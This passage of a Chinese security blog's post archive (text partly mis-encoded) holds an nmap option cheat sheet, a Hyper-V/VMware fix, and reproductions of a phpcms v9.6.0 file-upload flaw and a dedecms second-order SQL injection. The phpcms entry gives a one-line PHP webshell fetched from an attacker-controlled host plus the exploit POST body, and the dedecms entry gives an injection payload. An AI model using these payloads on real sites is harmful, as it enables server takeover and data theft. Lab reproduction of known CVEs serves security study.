data-language="bash"><code class="language-bash">nmap --randomize-hosts <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="MAXåœ°å€æ¬ºéª—"><a href="#MAXåœ°å€æ¬ºéª—" class="headerlink" title="MAXåœ°å€æ¬ºéª—"></a>MAXåœ°å€æ¬ºéª—</h4><p>è¦æ±‚Nmapåœ¨å‘é€åŸä»¥å¤ªç½‘å¸§æ—¶ä½¿ç”¨æŒ‡å®šçš„MACåœ°å€ï¼Œè¿™ä¸ªé€‰é¡¹éšå«äº† <code>--send-eth</code>é€‰é¡¹ï¼Œä»¥ä¿è¯NmapçœŸæ­£å‘é€ä»¥å¤ªç½‘åŒ…ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">-Pn</span> --spoof-mac <span class="token number">0</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>Nmapæä¾›5ç§ä¸åŒçš„è¾“å‡ºæ ¼å¼ã€‚é»˜è®¤çš„æ–¹å¼æ˜¯<code>interactive output</code>ï¼Œ å‘é€ç»™æ ‡å‡†è¾“å‡º(stdout)ã€‚</p><h4 id="æ ‡å‡†ä¿å­˜"><a href="#æ ‡å‡†ä¿å­˜" class="headerlink" title="æ ‡å‡†ä¿å­˜"></a>æ ‡å‡†ä¿å­˜</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oN</span> d:/xxx.txt <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="XMLä¿å­˜"><a href="#XMLä¿å­˜" class="headerlink" title="XMLä¿å­˜"></a>XMLä¿å­˜</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oX</span> d:/xxx.xml <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="133t-ä¿å­˜"><a href="#133t-ä¿å­˜" class="headerlink" title="133t ä¿å­˜"></a>133t ä¿å­˜</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oS</span> d:/xxx.txt <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Grep-ä¿å­˜"><a href="#Grep-ä¿å­˜" class="headerlink" title="Grep ä¿å­˜"></a>Grep ä¿å­˜</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oG</span> d:/xxx.txt <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼"><a href="#ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼" class="headerlink" title="ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼"></a>ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oA</span> d:/xxx <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¡¥å……ä¿å­˜æ–‡ä»¶"><a href="#è¡¥å……ä¿å­˜æ–‡ä»¶" class="headerlink" title="è¡¥å……ä¿å­˜æ–‡ä»¶"></a>è¡¥å……ä¿å­˜æ–‡ä»¶</h4><p>åœ¨è¾“å‡ºæ–‡ä»¶ä¸­æ·»åŠ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> -append-output <span class="token parameter variable">-oN</span> d:/xxx.txt <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è½¬æ¢-XML-ä¿å­˜"><a href="#è½¬æ¢-XML-ä¿å­˜" class="headerlink" title="è½¬æ¢ XML ä¿å­˜"></a>è½¬æ¢ XML ä¿å­˜</h4><p>å¸¸è§çš„è°ƒç”¨æ–¹å¼æ˜¯<code>--stylesheet https://nmap.org/data/nmap.xsl</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oX</span> xxx.xml <span class="token parameter variable">--stylesheet</span> https://nmap.org/data/nmap.xsl <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="å¿½ç•¥-XML-å£°æ˜çš„-XSL-æ ·å¼è¡¨"><a href="#å¿½ç•¥-XML-å£°æ˜çš„-XSL-æ ·å¼è¡¨" class="headerlink" title="å¿½ç•¥ XML å£°æ˜çš„ XSL æ ·å¼è¡¨"></a>å¿½ç•¥ XML å£°æ˜çš„ XSL æ ·å¼è¡¨</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-oX</span> d:/xxx.xml --no-stylesheet <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ç»§ç»­ä¸­æ–­çš„æ‰«æ"><a href="#ç»§ç»­ä¸­æ–­çš„æ‰«æ" class="headerlink" title="ç»§ç»­ä¸­æ–­çš„æ‰«æ"></a>ç»§ç»­ä¸­æ–­çš„æ‰«æ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--resume</span> <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-v</span> <span class="token punctuation">(</span>æé«˜è¾“å‡ºä¿¡æ¯çš„è¯¦ç»†åº¦<span class="token punctuation">)</span><span class="token parameter variable">-d</span> <span class="token punctuation">[</span>level<span class="token punctuation">]</span> <span class="token punctuation">(</span>æé«˜æˆ–è®¾ç½®è°ƒè¯•çº§åˆ«<span class="token punctuation">)</span>--packet-trace <span class="token punctuation">(</span>è·Ÿè¸ªå‘é€å’Œæ¥æ”¶çš„æŠ¥æ–‡<span class="token punctuation">)</span><span class="token parameter variable">--iflist</span> <span class="token punctuation">(</span>åˆ—ä¸¾æ¥å£å’Œè·¯ç”±<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><h4 id="æ‰«æIPV6åœ°å€"><a href="#æ‰«æIPV6åœ°å€" class="headerlink" title="æ‰«æIPV6åœ°å€"></a>æ‰«æIPV6åœ°å€</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-6</span> IPv6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ¿€çƒˆæ‰«ææ¨¡å¼"><a href="#æ¿€çƒˆæ‰«ææ¨¡å¼" class="headerlink" title="æ¿€çƒˆæ‰«ææ¨¡å¼"></a>æ¿€çƒˆæ‰«ææ¨¡å¼</h4><p>å…¨é¢æ‰«æ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¯´æ˜ç”¨æˆ·Nmapæ•°æ®æ–‡ä»¶ä½ç½®"><a href="#è¯´æ˜ç”¨æˆ·Nmapæ•°æ®æ–‡ä»¶ä½ç½®" class="headerlink" title="è¯´æ˜ç”¨æˆ·Nmapæ•°æ®æ–‡ä»¶ä½ç½®"></a>è¯´æ˜ç”¨æˆ·Nmapæ•°æ®æ–‡ä»¶ä½ç½®</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--datadir</span> <span class="token operator">&lt;</span>directoryname<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä½¿ç”¨åŸä»¥å¤ªç½‘å¸§å‘é€"><a href="#ä½¿ç”¨åŸä»¥å¤ªç½‘å¸§å‘é€" class="headerlink" title="ä½¿ç”¨åŸä»¥å¤ªç½‘å¸§å‘é€"></a>ä½¿ç”¨åŸä»¥å¤ªç½‘å¸§å‘é€</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --send-eth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åœ¨åŸIPå±‚å‘é€"><a href="#åœ¨åŸIPå±‚å‘é€" class="headerlink" title="åœ¨åŸIPå±‚å‘é€"></a>åœ¨åŸIPå±‚å‘é€</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --send-ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="å‡å®šç”¨æˆ·å…·æœ‰å…¨éƒ¨æƒé™"><a href="#å‡å®šç”¨æˆ·å…·æœ‰å…¨éƒ¨æƒé™" class="headerlink" title="å‡å®šç”¨æˆ·å…·æœ‰å…¨éƒ¨æƒé™"></a>å‡å®šç”¨æˆ·å…·æœ‰å…¨éƒ¨æƒé™</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--privileged</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ‰“å°ç‰ˆæœ¬ä¿¡æ¯"><a href="#æ‰“å°ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="æ‰“å°ç‰ˆæœ¬ä¿¡æ¯"></a>æ‰“å°ç‰ˆæœ¬ä¿¡æ¯</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -V/--version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ‰“å°å¸®åŠ©æ‘˜è¦é¢"><a href="#æ‰“å°å¸®åŠ©æ‘˜è¦é¢" class="headerlink" title="æ‰“å°å¸®åŠ©æ‘˜è¦é¢"></a>æ‰“å°å¸®åŠ©æ‘˜è¦é¢</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -h/--help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…· </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware Workstation åœ¨æ­¤ä¸»æœºä¸Šä¸æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–</title>
      <link href="/2021/12/04/vmwareworkstation-zai-ci-zhu-ji-shang-bu-zhi-chi-qian-tao-xu-ni-hua/"/>
      <url>/2021/12/04/vmwareworkstation-zai-ci-zhu-ji-shang-bu-zhi-chi-qian-tao-xu-ni-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="VMware-Workstation-åœ¨æ­¤ä¸»æœºä¸Šä¸æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–"><a href="#VMware-Workstation-åœ¨æ­¤ä¸»æœºä¸Šä¸æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–" class="headerlink" title="VMware Workstation åœ¨æ­¤ä¸»æœºä¸Šä¸æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–"></a>VMware Workstation åœ¨æ­¤ä¸»æœºä¸Šä¸æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–</h1><p>å½“æƒ³è¦ä½¿ç”¨vmwareçš„è™šæ‹ŸåŒ–å¼•æ“ï¼Œé‡åˆ°äº†ä»¥ä¸‹é—®é¢˜</p><ul><li><p>æ­¤ä¸»æœºæ”¯æŒAMD-Vï¼Œä½†AMD-Vå¤„äºç¦ç”¨çŠ¶æ€</p><p>è¿™æ˜¯å› ä¸ºç‰©ç†æœºæ²¡æœ‰æ‰“å¼€è™šæ‹ŸåŒ–ï¼Œå‚ç…§<a href="https://0xdadream.github.io/2021/11/27/kai-qi-xu-ni-hua/">å¼€å¯è™šæ‹ŸåŒ– | é€æ¢¦ (0xdadream.github.io)</a></p></li><li><p>æ­¤å¹³å°ä¸æ”¯æŒAMD-V</p></li><li><p>VMware Workstation åœ¨æ­¤ä¸»æœºä¸Šä¸æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–</p><p>è¿™æ—¶ä½ éœ€è¦æ‰“å¼€æ§åˆ¶é¢æ¿-ã€‹ç¨‹åºä¸åº”ç”¨-ã€‹å¯ç”¨æˆ–å…³é—­windowsåŠŸèƒ½ï¼Œå–æ¶ˆå‹¾é€‰Hyper-V</p><p><img src="https://s4.ax1x.com/2021/12/08/oWtgOJ.png" alt="oWtgOJ.png"></p><p>ä¸ç”¨ç®¡ä¸‹é¢é‚£ä¸ªè™šæ‹ŸåŒ–</p><p>ç„¶åå³é”®å¼€å§‹èœå•-ã€‹è®¡ç®—æœºç®¡ç†-ã€‹æœåŠ¡å’Œåº”ç”¨ç¨‹åº-ã€‹æœåŠ¡ï¼Œæ‰¾åˆ°HVä¸»æœºæœåŠ¡ï¼Œç¦ç”¨</p><p><img src="https://s4.ax1x.com/2021/12/08/oWtIfK.png" alt="oWtIfK.png"></p><p>è¿™æ ·è¿˜æ²¡æœ‰å®Œå…¨ç¦ç”¨ï¼Œç®¡ç†å‘˜æƒé™è¿è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bcdedit /set hypervisorlaunchtype off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·å°±èƒ½å®Œå…¨ç¦ç”¨äº†ï¼Œé‡å¯ä¾¿å¯ä½¿ç”¨é•¶åµŒè™šæ‹ŸåŒ–</p><p>æƒ³è¦å†å¯ç”¨hyperï¼Œå…³é—­ç¦ç”¨ï¼Œè¿è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bcdedit /set hypervisorlaunchtype auto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸»è¦æ˜¯ç”±äºhyperå’Œvmwareçš„å…¼å®¹æ€§é—®é¢˜å¯¼è‡´çš„ï¼Œé€€å›ä½ç‰ˆæœ¬å¯èƒ½ä¹Ÿå¯ä»¥è§£å†³ï¼Œæˆ‘æ²¡è¯•è¿‡å“ˆ</p></li></ul><p>ä¸Šè¿°çš„æ˜¯ä¸“ä¸šç‰ˆçš„Windowsï¼Œå®¶åº­ç‰ˆå¥½åƒç¨‹åºå’Œåº”ç”¨é‡Œæ²¡æœ‰Hyper-Vï¼Œå°±ä¸ç”¨å»å»æ‰å¤é€‰æ¡†ï¼Œå…¶ä»–è§£å†³æ–¹æ³•å’Œä¸Šé¢ä¸€æ ·</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´CVE-2018-14399</title>
      <link href="/2021/12/02/phpcmsv9.6.0-ren-yi-wen-jian-shang-chuan-lou-dong/"/>
      <url>/2021/12/02/phpcmsv9.6.0-ren-yi-wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´CVE-2018-14399"><a href="#phpcmsv9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´CVE-2018-14399" class="headerlink" title="phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´CVE-2018-14399"></a>phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´CVE-2018-14399</h1><h2 id="æ­å»ºç¯å¢ƒ"><a href="#æ­å»ºç¯å¢ƒ" class="headerlink" title="æ­å»ºç¯å¢ƒ"></a>æ­å»ºç¯å¢ƒ</h2><p>ä¸‹è½½phpcmsv9.6.0ï¼Œç„¶åå®‰è£…</p><p>ç™»å½•åˆ°åå°</p><p><img src="https://s4.ax1x.com/2021/12/08/oWtbOH.jpg" alt="oWtbOH.jpg"></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è¿›å…¥æ³¨å†Œé¡µé¢ï¼Œå¡«å†™æ³¨å†Œä¿¡æ¯</p><p><img src="https://s4.ax1x.com/2021/12/08/oWN91S.png" alt="oWN91S.png"></p><p>ç‚¹å‡»æ³¨å†ŒbpæŠ“åŒ…</p><p><img src="https://s4.ax1x.com/2021/12/08/oWNA7n.png" alt="oWNA7n.png"></p><p>åœ¨å¦ä¸€ä¸ªå¼€å¯webæœåŠ¡çš„ä¸»æœºçš„webæ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eavl</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„é€ poc</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">siteid</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">modelid</span><span class="token operator">=</span><span class="token number">10</span><span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>test<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>testtest<span class="token operator">&amp;</span><span class="token assign-left variable">pwdconfirm</span><span class="token operator">=</span>testtest<span class="token operator">&amp;</span><span class="token assign-left variable">email</span><span class="token operator">=</span>test%40gmail.com<span class="token operator">&amp;</span><span class="token assign-left variable">nickname</span><span class="token operator">=</span>test<span class="token operator">&amp;</span>info<span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&lt;</span>img <span class="token assign-left variable">src</span><span class="token operator">=</span>http://xxxxxip/shell.txt?.php<span class="token comment">#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ·»åŠ pocåˆ°åŒ…ä¸­</p><p><img src="https://s4.ax1x.com/2021/12/08/oWNu1U.png" alt="oWNu1U.png"></p><p>å‘é€åŒ…ï¼Œç„¶åä»å“åº”ä¸­è·å¾—shell.phpçš„è·¯å¾„ï¼Œå†é€šè¿‡èšå‰‘è¿æ¥</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> æ¼æ´å¤ç° </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecmsäºŒæ¬¡æ³¨å…¥æ¼æ´</title>
      <link href="/2021/11/30/dedecms-er-ci-zhu-ru-lou-dong/"/>
      <url>/2021/11/30/dedecms-er-ci-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="dedecmsäºŒæ¬¡æ³¨å…¥æ¼æ´"><a href="#dedecmsäºŒæ¬¡æ³¨å…¥æ¼æ´" class="headerlink" title="dedecmsäºŒæ¬¡æ³¨å…¥æ¼æ´"></a>dedecmsäºŒæ¬¡æ³¨å…¥æ¼æ´</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>é¦–å…ˆæ­å»ºç¯å¢ƒï¼Œæ³¨æ„phpç‰ˆæœ¬ä¸è¦å¤§äº5.3ï¼Œå®‰è£…å®Œååˆ é™¤installæ–‡ä»¶å¤¹</p><p>è¿›å…¥ä¸»é¡µæ˜¯è¿™æ ·çš„</p><p><img src="https://z3.ax1x.com/2021/11/30/o3T8r6.png" alt="o3T8r6.png"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ¼æ´ç‚¹åœ¨<code>\dedecms\plus\feedback.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//ä¿å­˜è¯„è®ºå†…å®¹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$comtype</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'comments'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$arctitle</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$inquery</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`)               VALUES ('<span class="token interpolation"><span class="token variable">$aid</span></span>','<span class="token interpolation"><span class="token variable">$typeid</span></span>','<span class="token interpolation"><span class="token variable">$username</span></span>','<span class="token interpolation"><span class="token variable">$arctitle</span></span>','<span class="token interpolation"><span class="token variable">$ip</span></span>','<span class="token interpolation"><span class="token variable">$ischeck</span></span>','<span class="token interpolation"><span class="token variable">$dtime</span></span>', '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cfg_ml</span><span class="token operator">-&gt;</span><span class="token constant">M_ID</span><span class="token punctuation">}</span></span>','0','0','<span class="token interpolation"><span class="token variable">$feedbacktype</span></span>','<span class="token interpolation"><span class="token variable">$face</span></span>','<span class="token interpolation"><span class="token variable">$msg</span></span>'); "</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">ExecuteNoneQuery</span><span class="token punctuation">(</span><span class="token variable">$inquery</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rs</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">ShowMsg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' å‘è¡¨è¯„è®ºé”™è¯¯! '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'-1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//echo $dsql-&gt;GetError();</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$arctitle = addslashes($title);</code>ï¼ŒæŠŠä¼ è¿›æ¥çš„å†…å®¹è½¬ä¹‰äº†ï¼Œç„¶åä¸‹é¢insertæŠŠè½¬ä¹‰åçš„å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ï¼Œè¿™å„¿æ²¡æœ‰ä»€ä¹ˆå¼‚å¸¸</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//å¼•ç”¨å›å¤</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$comtype</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'reply'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">GetOne</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Select * from `#@__feedback` where id ='<span class="token interpolation"><span class="token variable">$fid</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arctitle</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arctitle'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$aid</span> <span class="token operator">=</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$quotemsg</span><span class="token operator">.</span><span class="token variable">$msg</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">HtmlReplace</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$inquery</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`)VALUES ('<span class="token interpolation"><span class="token variable">$aid</span></span>','<span class="token interpolation"><span class="token variable">$typeid</span></span>','<span class="token interpolation"><span class="token variable">$username</span></span>','<span class="token interpolation"><span class="token variable">$arctitle</span></span>','<span class="token interpolation"><span class="token variable">$ip</span></span>','<span class="token interpolation"><span class="token variable">$ischeck</span></span>','<span class="token interpolation"><span class="token variable">$dtime</span></span>','<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cfg_ml</span><span class="token operator">-&gt;</span><span class="token constant">M_ID</span><span class="token punctuation">}</span></span>','0','0','<span class="token interpolation"><span class="token variable">$feedbacktype</span></span>','<span class="token interpolation"><span class="token variable">$face</span></span>','<span class="token interpolation"><span class="token variable">$msg</span></span>')"</span><span class="token punctuation">;</span><span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">ExecuteNoneQuery</span><span class="token punctuation">(</span><span class="token variable">$inquery</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$row = $dsql-&gt;GetOne("Select * from </code>#@__feedback<code> where id ='$fid'");</code></p><p><code>$arctitle = $row['arctitle'];</code></p><p>è¿™ä¸¤å¥ä»£ç å°†idä¸ºfidçš„è¯„è®ºçš„è¯»å–å‡ºæ¥ï¼Œå¹¶å°†ä¹‹å‰ä¿å­˜çš„æ ‡é¢˜èµ‹å€¼ç»™arctitleï¼Œç„¶åå†å°†è¿™ä¸ªå€¼æ’å…¥æ•°æ®åº“ä¸­ï¼Œè¿™æ—¶æ’å…¥çš„å€¼æ˜¯æ²¡æœ‰ç»è¿‡addslashesè½¬ä¹‰çš„ï¼Œè¿™å°±å¯¼è‡´äº†äºŒæ¬¡æ³¨å…¥</p><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><p>å…ˆç”¨ç®¡ç†å‘˜è´¦å·æ–°å¢ä¸€ä¸ªæ ç›®ç”¨æ¥å‘è¡¨æ–‡ç« dedecms/dede/</p><p><img src="https://z3.ax1x.com/2021/11/30/o3TtaD.png" alt="o3TtaD.png"></p><p>æ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·ç”¨æ¥åšæµ‹è¯•å¯¹è±¡</p><p><img src="https://z3.ax1x.com/2021/11/30/o3TgIg.png" alt="o3TgIg.png"></p><p>è¿›å…¥ä¸»é¡µéšä¾¿å‘å¸ƒä¸€ç¯‡æ–‡ç« </p><p><img src="https://z3.ax1x.com/2021/11/30/o3TWGj.png" alt="o3TWGj.png"></p><p>ç¬¬ä¸€æ¬¡æ³¨å…¥</p><p>æ ¹æ®ä»£ç æ„é€ payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">get  http:<span class="token comment">//dedecms/plus/feedback.php?aid=1</span>post  <span class="token keyword">action</span><span class="token operator">=</span>send<span class="token operator">&amp;</span>comtype<span class="token operator">=</span>comments<span class="token operator">&amp;</span>aid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>isconfirm<span class="token operator">=</span>yes<span class="token operator">&amp;</span>msg<span class="token operator">=</span>xx<span class="token operator">&amp;</span>validate<span class="token operator">=</span>GVZH<span class="token operator">&amp;</span>title<span class="token operator">=</span>xx<span class="token string">',(char(@`'</span><span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>aidä¸ºæ–‡ç« IDå·ï¼Œactionä¸ºå¤„ç†æ–¹å¼ï¼Œcomtypeä¸ºæ“ä½œæ–¹å¼ï¼Œvaildateä¸ºéªŒè¯ç ï¼Œä¹Ÿèƒ½æ³¨é‡Šæ‰æ–¹ä¾¿æµ‹è¯•ï¼Œtitleæœªæ 